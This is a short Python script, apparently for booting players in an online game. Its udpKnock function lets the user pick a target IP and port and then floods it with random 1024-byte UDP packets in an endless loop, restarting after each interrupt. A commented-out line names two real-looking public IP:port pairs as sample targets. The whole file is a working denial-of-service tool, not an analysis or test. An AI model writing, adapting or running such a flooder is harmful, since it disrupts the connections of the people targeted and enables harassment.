import socket
import random
import netCore

def udpKnock(canidateList):
    player = input("[?] Enter number of player to knock: ")
    try:
        player = int(player)-1
    except ValueError:
        print("[-] Invalid input, defaulting to 1!")
        player = 0
    
    sender = input("[?] Enter number of IP to use on knocking: ")
    try:
        sender = int(sender)-1
    except ValueError:
        print("[-] Invalid input, defaulting to 1!")
        sender = 0
    
    senderIP, senderPort = netCore.decompIP(canidateList[sender])

    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # Creates a socket
    sock.bind(("0.0.0.0", senderPort))                    # Binds the socket to the source IP and port

    ip, port = netCore.decompIP(canidateList[player])
    print("[+] Knock sequence initiated on {}:{}".format(ip,port))

    port = int(port)

    try:
        while True:
            bytes=random._urandom(1024)
            sock.sendto(bytes,(ip,port))
    except KeyboardInterrupt:
        print("[+] Knock sequence finished!")
        sock.close()
        udpKnock(canidateList)


#udpKnock(["47.4.125.176:53426", "108.247.104.80:51554"])

    